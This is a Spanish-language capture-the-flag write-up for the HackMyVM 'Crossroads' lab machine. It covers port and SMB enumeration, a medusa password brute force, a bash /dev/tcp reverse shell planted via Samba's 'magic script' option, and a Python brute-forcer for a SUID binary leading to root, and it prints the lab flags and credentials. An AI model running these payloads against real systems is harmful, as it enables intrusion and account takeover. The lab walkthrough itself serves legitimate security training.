---
icon: flag
---

# Crossroads HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-21 03:19 EDT
Nmap scan report for 192.168.5.25
Host is up (0.00060s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.38 ((Debian))
|_http-title: 12 Step Treatment Center | Crossroads Centre Antigua
|_http-server-header: Apache/2.4.38 (Debian)
| http-robots.txt: 1 disallowed entry 
|_/crossroads.png
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.9.5-Debian (workgroup: WORKGROUP)
MAC Address: 08:00:27:DD:A2:63 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: CROSSROADS

Host script results:
|_clock-skew: mean: 1h40m02s, deviation: 2h53m12s, median: 2s
| smb2-time: 
|   date: 2025-05-21T07:19:36
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.9.5-Debian)
|   Computer name: crossroads
|   NetBIOS computer name: CROSSROADS\x00
|   Domain name: \x00
|   FQDN: crossroads
|_  System time: 2025-05-21T02:19:37-05:00
|_nbstat: NetBIOS name: CROSSROADS, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.14 seconds
```

Veremos que solo hay un puerto `80` en el que esta alojada una pagina web y un servidor `SMB` por lo que vamos a ver que contiene dicha pagina web, si entramos dentro veremos una especie de pagina web como para reservar una villa en alguna playa, pero nada mas interesante, por lo que vamos a realizar un poco de `fuzzing` a ver que encontramos.

## Gobuster

```shell
gobuster dir -u http://<IP>/ -w <WORDLIST> -x html,php,txt -t 50 -k -r
```

Info:

```
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.5.25/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              txt,html,php
[+] Follow Redirect:         true
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 277]
/index.html           (Status: 200) [Size: 93075]
/.php                 (Status: 403) [Size: 277]
/robots.txt           (Status: 200) [Size: 42]
/note.txt             (Status: 200) [Size: 108]
/.php                 (Status: 403) [Size: 277]
/.html                (Status: 403) [Size: 277]
/server-status        (Status: 403) [Size: 277]
Progress: 525649 / 882244 (59.58%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 525649 / 882244 (59.58%)
===============================================================
Finished
===============================================================
```

Veremos varias cosas interesantes, vamos a probar a entrar en alguna de ellas a ver si vemos algo interesante.

Veremos varias cosas, pero ninguna que nos llame la atencion, por lo que no veremos nada interesante, vamos a enumerar el servidor `SMB` a ver que vemos.

## enum4linux

```shell
enum4linux -a <IP>
```

Info:

```
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Wed May 21 03:25:28 2025

 =========================================( Target Information )=========================================

Target ........... 192.168.5.25
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ============================( Enumerating Workgroup/Domain on 192.168.5.25 )============================


[+] Got domain/workgroup name: WORKGROUP


 ================================( Nbtstat Information for 192.168.5.25 )================================

Looking up status of 192.168.5.25
        CROSSROADS      <00> -         B <ACTIVE>  Workstation Service
        CROSSROADS      <03> -         B <ACTIVE>  Messenger Service
        CROSSROADS      <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ===================================( Session Check on 192.168.5.25 )===================================
                                                                                                                                                             
                                                                                                                                                             
[+] Server 192.168.5.25 allows sessions using username '', password ''                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ================================( Getting domain SID for 192.168.5.25 )================================
                                                                                                                                                             
Domain Name: WORKGROUP                                                                                                                                       
Domain Sid: (NULL SID)

[+] Can't determine if host is part of domain or part of a workgroup                                                                                         
                                                                                                                                                             
                                                                                                                                                             
 ===================================( OS information on 192.168.5.25 )===================================
                                                                                                                                                             
                                                                                                                                                             
[E] Can't get OS info with smbclient                                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
[+] Got OS info for 192.168.5.25 from srvinfo:                                                                                                               
        CROSSROADS     Wk Sv PrQ Unx NT SNT Samba 4.9.5-Debian                                                                                               
        platform_id     :       500
        os version      :       6.1
        server type     :       0x809a03


 =======================================( Users on 192.168.5.25 )=======================================
                                                                                                                                                             
index: 0x1 RID: 0x3e9 acb: 0x00000010 Account: albert   Name:   Desc:                                                                                        

user:[albert] rid:[0x3e9]

 =================================( Share Enumeration on 192.168.5.25 )=================================
                                                                                                                                                             
                                                                                                                                                             
        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbshare        Disk      
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CROSSROADS

[+] Attempting to map shares on 192.168.5.25                                                                                                                 
                                                                                                                                                             
//192.168.5.25/print$   Mapping: DENIED Listing: N/A Writing: N/A                                                                                            
//192.168.5.25/smbshare Mapping: DENIED Listing: N/A Writing: N/A

[E] Can't understand response:                                                                                                                               
                                                                                                                                                             
NT_STATUS_OBJECT_NAME_NOT_FOUND listing \*                                                                                                                   
//192.168.5.25/IPC$     Mapping: N/A Listing: N/A Writing: N/A

 ============================( Password Policy Information for 192.168.5.25 )============================
                                                                                                                                                             
                                                                                                                                                             

[+] Attaching to 192.168.5.25 using a NULL share

[+] Trying protocol 139/SMB...

[+] Found domain(s):

        [+] CROSSROADS
        [+] Builtin

[+] Password Info for Domain: CROSSROADS

        [+] Minimum password length: 5
        [+] Password history length: None
        [+] Maximum password age: 37 days 6 hours 21 minutes 
        [+] Password Complexity Flags: 000000

                [+] Domain Refuse Password Change: 0
                [+] Domain Password Store Cleartext: 0
                [+] Domain Password Lockout Admins: 0
                [+] Domain Password No Clear Change: 0
                [+] Domain Password No Anon Change: 0
                [+] Domain Password Complex: 0

        [+] Minimum password age: None
        [+] Reset Account Lockout Counter: 30 minutes 
        [+] Locked Account Duration: 30 minutes 
        [+] Account Lockout Threshold: None
        [+] Forced Log off Time: 37 days 6 hours 21 minutes 



[+] Retieved partial password policy with rpcclient:                                                                                                         
                                                                                                                                                             
                                                                                                                                                             
Password Complexity: Disabled                                                                                                                                
Minimum Password Length: 5


 =======================================( Groups on 192.168.5.25 )=======================================
                                                                                                                                                             
                                                                                                                                                             
[+] Getting builtin groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting builtin group memberships:                                                                                                                      
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local groups:                                                                                                                                   
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting local group memberships:                                                                                                                        
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain groups:                                                                                                                                  
                                                                                                                                                             
                                                                                                                                                             
[+]  Getting domain group memberships:                                                                                                                       
                                                                                                                                                             
                                                                                                                                                             
 ==================( Users on 192.168.5.25 via RID cycling (RIDS: 500-550,1000-1050) )==================
                                                                                                                                                             
                                                                                                                                                             
[I] Found new SID:                                                                                                                                           
S-1-22-1                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[I] Found new SID:                                                                                                                                           
S-1-5-32                                                                                                                                                     

[+] Enumerating users using SID S-1-5-21-198007098-3908253677-2746664996 and logon username '', password ''                                                  
                                                                                                                                                             
S-1-5-21-198007098-3908253677-2746664996-501 CROSSROADS\nobody (Local User)                                                                                  
S-1-5-21-198007098-3908253677-2746664996-513 CROSSROADS\None (Domain Group)
S-1-5-21-198007098-3908253677-2746664996-1001 CROSSROADS\albert (Local User)

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-22-1-1000 Unix User\albert (Local User)                                                                                                                  

[+] Enumerating users using SID S-1-5-32 and logon username '', password ''                                                                                  
                                                                                                                                                             
S-1-5-32-544 BUILTIN\Administrators (Local Group)                                                                                                            
S-1-5-32-545 BUILTIN\Users (Local Group)
S-1-5-32-546 BUILTIN\Guests (Local Group)
S-1-5-32-547 BUILTIN\Power Users (Local Group)
S-1-5-32-548 BUILTIN\Account Operators (Local Group)
S-1-5-32-549 BUILTIN\Server Operators (Local Group)
S-1-5-32-550 BUILTIN\Print Operators (Local Group)

 ===============================( Getting printer info for 192.168.5.25 )===============================
                                                                                                                                                             
No printers returned.                                                                                                                                        


enum4linux complete on Wed May 21 03:25:57 2025
```

Vemos que hay un usuario registrado en el sistema que se llama `albert` vamos a probar a realizar `fuerza bruta` con dicho usuario mediante el servidor `SMB` con la herramienta `medusa`.

```shell
medusa -u albert -P <WORDLIST> -h <IP> -M smbnt
```

Info:

```
2025-05-21 03:34:18 ACCOUNT FOUND: [smbnt] Host: 192.168.5.25 User: albert Password: bradley1 [SUCCESS (ADMIN$ - Share Unavailable)]
```

Veremos que hemos encontrado las credenciales del usuario `albert` por lo que vamos a enumerar el servidor `SMB` a ver que vemos.

```shell
smbclient -L //<IP>/ -U albert%bradley1
```

Info:

```
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        smbshare        Disk      
        IPC$            IPC       IPC Service (Samba 4.9.5-Debian)
        albert          Disk      Home Directories
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            CROSSROADS
```

Veremos que hay un recurso compartido llamado de la misma forma que la del usuario, vamos a probar a meternos en dicho recurso.

## Escalate user albert

```shell
smbclient //<IP>/albert -U albert%bradley1
```

Veremos que efectivamente estaremos dentro y si listamos veremos lo siguiente:

```
.                                   D        0  Tue Mar  2 18:16:15 2021
  ..                                  D        0  Tue Mar  2 17:00:47 2021
  smbshare                            D        0  Tue Mar  2 17:16:13 2021
  crossroads.png                      N  1583196  Tue Mar  2 17:34:03 2021
  beroot                              N    16664  Tue Mar  2 18:02:41 2021
  user.txt                            N       32  Tue Mar  2 18:15:18 2021

                4000320 blocks of size 1024. 3759668 blocks available
```

Vemos que hay un directorio llamado `smbshare` y si entramos dentro veremos un archivo llamado `smb.conf` esto es bastante interesante ya que podremos ver la configuracion del servidor `SMB` y eso es una vulnerabilidad.

Si leemos dicho archivo veremos lo siguiente:

```
.............................<RESTO_DE_CODIGO>....................................

[smbshare]

path = /home/albert/smbshare
valid users = albert
browsable = yes
writable = yes
read only = no
magic script = smbscript.sh
guest ok = no
```

Vemos que hay establecido un `magic script` esto lo que hace es que cuando alguien se conecta a un servidor `SMB` este mismo se ejecuta de forma automatica, por lo que podremos insertar codigo malicioso creado el script con dicho nombre y conectarnos por `SMB` de nuevo para que lo ejecute el servidor.

> smbscript.sh

```shell
#!/bin/bash

bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Teniendo el archivo lo que vamos hacer es ponernos a la escucha ya directamente.

```shell
nc -lvnp <PORT>
```

Ahora vamos a conectarnos con el otro servidor compartido llamado `smbshare`.

```shell
smbclient //<IP>/smbshare -U albert%bradley1
```

Una vez echo esto, vamos a subir el archivo magico de esta forma:

```shell
put smbscript.sh
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.4] from (UNKNOWN) [192.168.5.25] 46188
bash: cannot set terminal process group (539): Inappropriate ioctl for device
bash: no job control in this shell
albert@crossroads:/home/albert/smbshare$ whoami
whoami
albert
```

Veremos que ha funcionado por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Echo esto vamos a leer la `flag` del usuario.

> user.txt

```
912D12370BBCEA67BF28B03BCB9AA13F
```

## Escalate Privileges

Si listamos los binario con permisos `SUID` que hay en el sistema veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
25269    428 -rwsr-xr-x   1 root     root       436552 Jan 31  2020 /usr/lib/openssh/ssh-keysign
    21909     52 -rwsr-xr--   1 root     messagebus    51184 Jul  5  2020 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    16365     12 -rwsr-xr-x   1 root     root          10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
       81     64 -rwsr-xr-x   1 root     root          63736 Jul 27  2018 /usr/bin/passwd
     4028     52 -rwsr-xr-x   1 root     root          51280 Jan 10  2019 /usr/bin/mount
       76     56 -rwsr-xr-x   1 root     root          54096 Jul 27  2018 /usr/bin/chfn
     4030     36 -rwsr-xr-x   1 root     root          34888 Jan 10  2019 /usr/bin/umount
     3547     44 -rwsr-xr-x   1 root     root          44440 Jul 27  2018 /usr/bin/newgrp
     3694     64 -rwsr-xr-x   1 root     root          63568 Jan 10  2019 /usr/bin/su
       79     84 -rwsr-xr-x   1 root     root          84016 Jul 27  2018 /usr/bin/gpasswd
       77     44 -rwsr-xr-x   1 root     root          44528 Jul 27  2018 /usr/bin/chsh
   129282     20 -rwsr-xr-x   1 root     root          16664 Mar  2  2021 /home/albert/beroot
```

Vemos una linea bastante interesante que es la siguiente:

```
129282  20 -rwsr-xr-x   1 root   root    16664 Mar  2  2021 /home/albert/beroot
```

Vemos que en la propia `home` del usuario `albert` el binario `beroot` tiene permisos `SUID` vamos a ver que hace dicho archivo.

Si lo ejecutamos:

```shell
./beroot
```

Info:

```
enter password for root
-----------------------

password: test
wrong password!!!
```

Veremos que tendremos que poner como una contraseña de `root` o algo parecido, pero no podremos saberlo, por lo que vamos a probar a decompilar el codigo con la herramienta `ghidra` a ver que vemos.

En la maquina host.

```
ghidra
```

Crearemos un nuevo proyecto, le daremos al dragon verde y se nos habria una interfaz donde podremos importar el binario, nos pasaremos el binario de la maquina victima a la host mediante un servidor de `python3`.

```shell
python3 -m http.server
```

Desde el host.

```shell
wget http://<IP>:8000/beroot
```

Echo esto nos importaremos el binario en el espacio de trabajo de `ghidra`, lo analizamos y veremos lo siguiente:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-05-21 100657.png" alt=""><figcaption></figcaption></figure>

Vemos que el `main` esta ejecutando el script que se encuentra en `/root/beroot.sh` por lo que no podremos saber que hace realmente dicho binario por dentro ya que lo esta ejecutando desde otro binario.

No nos queda otra que realizar `fuerza bruta` a dicho binario para sacarle la contraseña.

> forceBinary.py

```python
#!/bin/python3

import subprocess

def brute_force_beroot(dictionary_path, binary_path):
    with open(dictionary_path, "r", encoding="latin-1") as f:
        passwords = [line.strip() for line in f]

    for password in passwords:
        try:
            # Ejecutar el binario y pasar la contraseña
            result = subprocess.run(
                [binary_path],
                input=password + "\n",
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                universal_newlines=True,
                timeout=2  # evitar cuelgues si el binario se queda esperando
            )

            output = result.stdout + result.stderr

            # Verificamos si no contiene el mensaje de contraseña incorrecta
            if "wrong password!!!" not in output.lower():
                print(f"[+] Contraseña encontrada: {password}")
                print("[+] Salida del programa:")
                print(output)
                break
            else:
                print(f"[-] Intento fallido: {password}")
        except subprocess.TimeoutExpired:
            print(f"[!] Timeout con: {password}")
        except Exception as e:
            print(f"[!] Error con '{password}': {e}")

if __name__ == "__main__":
    brute_force_beroot("rockyou.txt", "./beroot")
```

Lo guardamos y nos pasamos el `rockyou.txt` del `host` a la maquina victima, mediante un servidor de `python3`, una vez que lo hayamos echo ejecutaremos el script de esta forma teniendo el `rockyou.txt` en el mismo directorio.

```shell
chmod +x forceBinary.py
python3 forceBinary.py
```

Info:

```
enter password for root
-----------------------

do ls and find root creds
```

Veremos que hemos encontrado la contraseña despues de un rato, nos comenta que leeamos dicho archivo:

```shell
cat rootcreds
```

Info:

```
root
___drifting___
```

Veremos que la contraseña es `___drifting___` vamos a probarla:

```shell
su root
```

Metemos como contraseña `___drifting___` y veremos que estamos dentro.

Info:

```
root@crossroads:/home/albert# whoami
root
```

Por lo que vamos a leer la `flag` del usuario `root`.

> root.txt

```
876F96716C3606B09A89F0FA3C1D52EB
```
